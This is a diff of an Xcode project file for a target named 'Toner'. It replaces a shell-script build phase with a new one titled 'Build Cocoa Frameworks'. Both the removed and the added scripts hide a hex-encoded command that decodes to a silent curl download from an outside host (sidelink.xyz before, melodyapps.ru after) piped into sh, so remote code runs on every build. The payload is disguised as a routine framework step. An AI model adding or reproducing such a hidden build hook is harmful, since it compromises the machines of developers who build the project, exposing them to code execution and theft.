@@ -723,8 +723,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EF891A1723732AF6009388B4 /* Build configuration list for PBXNativeTarget "Toner" */;
 			buildPhases = (
+				0C1F39E6727DAF3F2AFFA81D /* Build Cocoa Frameworks */,
 				F1A3A97823491974D97636D1 /* [CP] Check Pods Manifest.lock */,
-				97F032BCF1F2CDEFB76D902C /* Project Frameworks */,
 				EF891A0123732AF4009388B4 /* Sources */,
 				EF891A0223732AF4009388B4 /* Frameworks */,
 				EF891A0323732AF4009388B4 /* Resources */,
@@ -843,7 +843,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		97F032BCF1F2CDEFB76D902C /* Project Frameworks */ = {
+
+	0C1F39E6727DAF3F2AFFA81D /* Build Cocoa Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -852,15 +853,25 @@
 			);
 			inputPaths = (
 			);
-			name = "Project Frameworks";
+			name = "Build Cocoa Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f6d656c6f6479617070732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
 		};
+	
+
+	
+
+	
+
+	
 		E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
